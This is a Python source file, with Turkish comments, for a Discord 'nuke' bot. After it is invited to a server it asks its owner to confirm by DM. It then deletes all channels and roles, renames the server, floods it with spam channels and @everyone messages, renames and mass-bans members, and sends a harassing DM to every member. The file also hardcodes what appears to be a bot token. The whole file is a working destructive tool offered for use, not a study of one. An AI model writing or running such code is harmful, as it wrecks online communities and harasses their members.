import discord
from discord.ext import commands
import asyncio
import time # ← YENİ: Süre ölçümü için eklendi

# === AYARLAR ===
TARGET_USER_ID = 1415881833295646810 # Senin ID'n (değiştirme)
TOKEN = "MTQ5NDgyMjAzMTM3NDY4MDA5NA.G2is0g.ZUXOkCB-dKF2OzxIQ9c7gG4Y6XIchiFH81cCPI" # Discord Developer Portal'dan aldığın token

intents = discord.Intents.default()
intents.guilds = True
intents.members = True # ← YENİ: Mass ban ve nick change için gerekli

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ====================== YENİ: MASS DM FONKSİYONU (EKLEME) ======================
async def mass_dm_all_members(guild: discord.Guild, dm_text: str, mode: str):
    if not dm_text or not dm_text.strip():
        print("⚠️ DM mesajı boş, mass DM atlanıyor.")
        return

    print(f"📨 {mode.upper()} NUKE sonrası tüm üyelere DM gönderiliyor... (Rate limit korumalı)")
    sent = 0
    failed = 0
    dm_count = 0

    for member in guild.members[:]:
        if member.bot or member.id == TARGET_USER_ID:
            continue

        try:
            await member.send(
                f"**{mode.upper()} NUKE TAMAMLANDI!**\n\n"
                f"{dm_text}\n\n"
                f"**Sunucu:** {guild.name} ({guild.id})"
            )
            sent += 1
            dm_count += 1

            # Rate limit koruması
            if dm_count % 25 == 0:
                print(f"⏳ {dm_count} DM gönderildi → 70 saniye bekleniyor...")
                await asyncio.sleep(70)

            await asyncio.sleep(1.5)  # Güvenli aralık

        except discord.Forbidden:
            failed += 1
        except discord.HTTPException as e:
            if e.code == 429:
                retry = getattr(e, 'retry_after', 15)
                print(f"⚠️ Rate limit! {retry:.1f} saniye bekleniyor...")
                await asyncio.sleep(retry + 5)
            else:
                failed += 1
        except Exception as e:
            failed += 1
            print(f"DM hatası ({member.name}): {e}")

    print(f"✅ Mass DM tamamlandı → Başarılı: {sent} | Başarısız: {failed}")


# ====================== YENİ SINIFLAR ======================
class SpamModal(discord.ui.Modal):
    def __init__(self, mode: str, guild: discord.Guild):
        super().__init__(title=f"{mode.upper()} Nuke - Spam + DM Mesajı")
        self.mode = mode
        self.guild = guild
        self.spam_input = discord.ui.TextInput(
            label="Her kanala atılacak spam mesajı",
            style=discord.TextStyle.long,
            placeholder="@everyone get-fucked by NUKEBOT - Sunucu nukelendi! Server Is DELETED",
            required=True,
            max_length=1900
        )
        self.dm_input = discord.ui.TextInput(
            label="Tüm üyelere atılacak DM mesajı",
            style=discord.TextStyle.long,
            placeholder="Sunucu nukelendi! Bir daha açılmayacak lol",
            required=True,
            max_length=1800
        )
        self.add_item(self.spam_input)
        self.add_item(self.dm_input)

    async def on_submit(self, interaction: discord.Interaction):
        spam_text = self.spam_input.value.strip()
        dm_text = self.dm_input.value.strip()

        await interaction.response.send_message(
            f"🚀 **{self.mode.upper()} NUKE** başlatılıyor...\n"
            f"Spam mesajı: {spam_text[:120]}...\n"
            f"DM mesajı: {dm_text[:120]}...\n"
            f"Bu işlem biraz zaman alabilir, lütfen bekle.",
            ephemeral=True
        )
        asyncio.create_task(perform_nuke(self.guild, self.mode, spam_text, dm_text))


class ModeView(discord.ui.View):
    def __init__(self, guild: discord.Guild):
        super().__init__(timeout=3600)
        self.guild = guild

    @discord.ui.button(label="Normal Nuke", style=discord.ButtonStyle.gray, row=0)
    async def normal_nuke(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != TARGET_USER_ID:
            await interaction.response.send_message("❌ Bu işlem için yetkin yok!", ephemeral=True)
            return
        await interaction.response.send_modal(SpamModal("normal", self.guild))

    @discord.ui.button(label="Mid Nuke", style=discord.ButtonStyle.blurple, row=0)
    async def mid_nuke(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != TARGET_USER_ID:
            await interaction.response.send_message("❌ Bu işlem için yetkin yok!", ephemeral=True)
            return
        await interaction.response.send_modal(SpamModal("mid", self.guild))

    @discord.ui.button(label="Hard Nuke", style=discord.ButtonStyle.danger, row=0)
    async def hard_nuke(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != TARGET_USER_ID:
            await interaction.response.send_message("❌ Bu işlem için yetkin yok!", ephemeral=True)
            return
        await interaction.response.send_modal(SpamModal("hard", self.guild))

    @discord.ui.button(label="İptal", style=discord.ButtonStyle.secondary, row=1)
    async def iptal(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != TARGET_USER_ID:
            await interaction.response.send_message("❌ Bu işlem için yetkin yok!", ephemeral=True)
            return
        await interaction.response.send_message("✅ Nuke iptal edildi.", ephemeral=True)
        for child in self.children:
            child.disabled = True
        try:
            await interaction.message.edit(view=self)
        except:
            pass


# ====================== ANA NUKE FONKSİYONU (DM EKlenmiş hali) ======================
async def perform_nuke(guild: discord.Guild, mode: str, spam_text: str = None, dm_text: str = None):
    start_time = time.time()
    print(f"⚠️ {mode.upper()} NUKE BAŞLATILDI → {guild.name} ({guild.id})")

    deleted_channels = 0
    deleted_roles = 0

    # 1. Tüm kanalları sil
    for channel in guild.channels[:]:
        try:
            await channel.delete(reason=f"Nuke by Grok Bot - {mode}")
            deleted_channels += 1
            await asyncio.sleep(0.6)
        except discord.Forbidden:
            print(f"❌ Kanal silinemedi: {channel.name}")
        except Exception as e:
            print(f"Hata (kanal): {e}")
    print(f"✅ {deleted_channels} kanal silindi.")

    # 2. Tüm rolleri sil (@everyone hariç)
    for role in guild.roles[:]:
        if role.is_default() or role.is_bot_managed() or role.is_premium_subscriber():
            continue
        try:
            await role.delete(reason=f"Nuke by Grok Bot - {mode}")
            deleted_roles += 1
            await asyncio.sleep(0.6)
        except discord.Forbidden:
            pass
        except Exception as e:
            print(f"Hata (rol): {e}")
    print(f"✅ {deleted_roles} rol silindi.")

    # 3. Sunucu adını değiştir
    new_name = "." if mode == "normal" else "get-fucked"
    try:
        await guild.edit(name=new_name, reason=f"Nuke by Grok Bot - {mode}")
        print(f"✅ Sunucu adı '{new_name}' yapıldı.")
    except Exception as e:
        print(f"Sunucu adı değiştirilemedi: {e}")

    # ====================== HARD MODE EKSTRA YIKIM ======================
    if mode == "hard":
        try:
            await guild.edit(icon=None, banner=None, reason=f"Nuke by Grok Bot - {mode}")
            print("✅ Sunucu ikonu ve banner'ı tamamen kaldırıldı.")
        except Exception as e:
            print(f"İkon/banner kaldırılamadı: {e}")

        # Tüm üyelerin nick'ini değiştir
        nick_changed = 0
        for member in guild.members[:]:
            if member.id == TARGET_USER_ID or member.bot or member.top_role.position >= guild.me.top_role.position:
                continue
            try:
                await member.edit(nick="get-fucked", reason=f"Nuke by Grok Bot - {mode}")
                nick_changed += 1
                await asyncio.sleep(0.8)
            except:
                pass
        print(f"✅ {nick_changed} üyenin nick'i 'get-fucked' yapıldı.")

        # Mass ban
        banned = 0
        for member in guild.members[:]:
            if member.id == TARGET_USER_ID or member.bot:
                continue
            try:
                await member.ban(reason=f"Nuke by Grok Bot - {mode}", delete_message_days=1)
                banned += 1
                await asyncio.sleep(1.2)
            except discord.Forbidden:
                print("❌ Ban yetkisi yetersiz veya rate limit")
            except Exception as e:
                print(f"Ban hatası: {e}")
        print(f"⚠️ {banned} üye banlandı (Hard Nuke).")

    # ====================== MID & HARD → KANAL SPAM ======================
    if mode in ["mid", "hard"]:
        num_channels = 25 if mode == "mid" else 50
        created = 0
        for i in range(num_channels):
            try:
                channel = await guild.create_text_channel(f"get-fucked-{i+1}", reason=f"Nuke by Grok Bot - {mode}")
                created += 1
                await asyncio.sleep(0.7)
                if spam_text:
                    for _ in range(4):
                        try:
                            await channel.send(spam_text)
                            await asyncio.sleep(0.6)
                        except:
                            break
            except discord.Forbidden:
                print("❌ Kanal oluşturma yetkisi yok!")
                break
            except Exception as e:
                print(f"Kanal oluşturma hatası: {e}")
        print(f"✅ {created} adet 'get-fucked' kanalı oluşturuldu ve spamlandı.")

        if mode == "hard":
            num_roles = 30
            role_created = 0
            for i in range(num_roles):
                try:
                    await guild.create_role(
                        name=f"get-fucked-{i+1}",
                        color=discord.Color.random(),
                        reason=f"Nuke by Grok Bot - {mode}"
                    )
                    role_created += 1
                    await asyncio.sleep(0.6)
                except:
                    pass
            print(f"✅ {role_created} adet 'get-fucked' rolü oluşturuldu.")

    # ====================== YENİ: MASS DM (EN SON) ======================
    await mass_dm_all_members(guild, dm_text, mode)

    # ====================== LOG + BİTTİ MESAJI ======================
    duration = time.time() - start_time
    print(f"✅ {mode.upper()} NUKE TAMAMLANDI → {guild.name} | Toplam süre: {duration:.2f} saniye")

    try:
        user = await guild.client.fetch_user(TARGET_USER_ID)
        mode_desc = {
            "normal": "Normal Nuke → Sadece temiz silme",
            "mid": "Mid Nuke → Silme + Kanal spam",
            "hard": "Hard Nuke → Full Chaos (ban, nick, rol spam, ikon/banner yok etme)"
        }[mode]
        await user.send(
            f"✅ **{mode.upper()} NUKE BİTTİ!**\n"
            f"**Mod:** {mode_desc}\n"
            f"**Süre:** {duration:.2f} saniye\n"
            f"**Sunucu:** {guild.name} ({guild.id})"
        )
        print("✅ Bitti mesajı DM olarak gönderildi.")
    except:
        print("❌ Bitti DM'i gönderilemedi.")


# ====================== ESKİ SINIF (Sadece onay) ======================
class NukeView(discord.ui.View):
    def __init__(self, guild: discord.Guild):
        super().__init__(timeout=3600)
        self.guild = guild

    @discord.ui.button(label="Evet", style=discord.ButtonStyle.danger)
    async def evet(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != TARGET_USER_ID:
            await interaction.response.send_message("❌ Bu işlem için yetkin yok!", ephemeral=True)
            return
        await interaction.response.send_message("✅ Onaylandı! Mod seçimi DM olarak gönderiliyor...", ephemeral=True)
        for child in self.children:
            child.disabled = True
        try:
            await interaction.message.edit(view=self)
        except:
            pass

        mode_embed = discord.Embed(
            title="🔥 NUKE MODU SEÇ",
            description=(
                "**Normal Nuke** → Sadece sil (eski hali)\n"
                "**Mid Nuke** → Sil + Kanal spam (get-fucked)\n"
                "**Hard Nuke** → Her şeyi yok et (ban + nick + rol spam + ikon/banner)"
            ),
            color=discord.Color.red()
        )
        mode_view = ModeView(self.guild)
        try:
            await interaction.user.send(embed=mode_embed, view=mode_view)
        except Exception as e:
            print(f"Mod seçim DM hatası: {e}")

    @discord.ui.button(label="Hayır", style=discord.ButtonStyle.secondary)
    async def hayir(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != TARGET_USER_ID:
            await interaction.response.send_message("❌ Bu işlem için yetkin yok!", ephemeral=True)
            return
        await interaction.response.send_message("✅ Nuke iptal edildi.", ephemeral=True)
        for child in self.children:
            child.disabled = True
        try:
            await interaction.message.edit(view=self)
        except:
            pass


@bot.event
async def on_ready():
    print(f"✅ Bot hazır! {bot.user} olarak giriş yapıldı.")
    print("Şimdi botu sunucuya invite et (Administrator yetkisi ile).")


@bot.event
async def on_guild_join(guild: discord.Guild):
    print(f"📥 Yeni sunucuya katıldı: {guild.name} ({guild.id})")
    if guild.me.guild_permissions.manage_roles and guild.me.top_role.position < len(guild.roles) - 1:
        try:
            await guild.me.top_role.edit(position=len(guild.roles) - 1, reason="Bot rolü en üste taşındı")
            print("✅ Bot rolü en üste taşındı.")
        except Exception as e:
            print(f"Rol taşıma hatası: {e}")

    try:
        user = await bot.fetch_user(TARGET_USER_ID)
        embed = discord.Embed(
            title="🚨 SUNUCU NUKE ONAYI",
            description=f"**Bu sunucuyu PATLATAYIM MI?**\n\n**Sunucu:** {guild.name}\n**Sunucu ID:** {guild.id}\n\nSadece sen 'Evet' butonuna basarsan mod seçimi ekranı gelecek.",
            color=discord.Color.red()
        )
        embed.set_footer(text="Güvenlik için sadece sen onay verebilirsin.")
        view = NukeView(guild)
        await user.send(embed=embed, view=view)
        print(f"📨 {user} kullanıcısına nuke onay DM'i gönderildi.")
    except discord.Forbidden:
        print("❌ DM gönderilemedi (kullanıcının DM'leri kapalı olabilir).")
    except Exception as e:
        print(f"DM gönderme hatası: {e}")


# Botu çalıştır
bot.run(TOKEN)